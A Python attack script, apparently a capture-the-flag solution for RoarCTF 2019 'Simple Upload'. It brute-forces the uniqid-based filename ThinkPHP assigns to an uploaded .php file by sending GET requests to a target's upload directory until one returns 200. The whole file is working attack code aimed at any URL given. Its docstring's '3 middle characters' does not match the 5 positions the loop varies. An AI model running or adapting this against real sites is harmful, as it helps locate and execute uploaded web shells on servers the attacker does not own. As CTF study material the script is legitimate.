# -*- coding: utf-8 -*-
"""tpupload.py ThinkPHP 上传文件名爆破([RoarCTF 2019]Simple Upload)

来源: WP 汇总/[RoarCTF 2019]Simple Upload
用途: ThinkPHP upload() 不传参时批量上传会把文件名改成
      `62189f42e7517.txt` 这类 uniqid 形式; 响应只泄露一段,
      上传 .php 又不回显文件名 —— 用已知前后缀对中间字符做笛卡尔积爆破,
      逐个 GET 试出真实文件名(200 即命中)。

依赖:
    pip install requests

用法(实战, 需网络):
    python tpupload.py -u "http://target/Public/Uploads/" --prefix 62189f4 --start "234" --mid "bcdef" --tail "1234567890abcdef"
    # start/mid/tail 即 WP 中泄露出前缀后剩的候选字符集, 中间 3 位逐位试
"""
import argparse
import sys

import requests


def brute(base_url, prefix, start, mid, tail):
    """对 uniqid 中间三位做笛卡尔积, 命中(HTTP 200)即打印并收集。"""
    hits = []
    for a in start:
        for b in mid:
            for c in tail:
                for d in tail:
                    for e in tail:
                        name = prefix + a + b + c + d + e + '.php'
                        url_new = base_url + name
                        try:
                            r = requests.get(url_new, timeout=8)
                        except requests.RequestException:
                            continue
                        if r.status_code == 200:
                            print('[+] ' + url_new)
                            hits.append(url_new)
    return hits


def main():
    ap = argparse.ArgumentParser(description='ThinkPHP 上传文件名(uniqid)爆破')
    ap.add_argument('-u', '--url', required=True,
                    help='上传目录 URL, 如 http://target/Public/Uploads/')
    ap.add_argument('--prefix', default='62189f4', help='已泄露的文件名前缀')
    ap.add_argument('--start', default='234', help='第 1 位候选字符集')
    ap.add_argument('--mid', default='bcdef', help='第 2 位候选字符集')
    ap.add_argument('--tail', default='1234567890abcdef', help='末 3 位候选字符集')
    args = ap.parse_args()

    if getattr(sys.stdout, 'reconfigure', None):
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

    hits = brute(args.url, args.prefix, args.start, args.mid, args.tail)
    print('[*] 命中文件: %s' % (hits or '无'))
    return 0


if __name__ == '__main__':
    sys.exit(main())
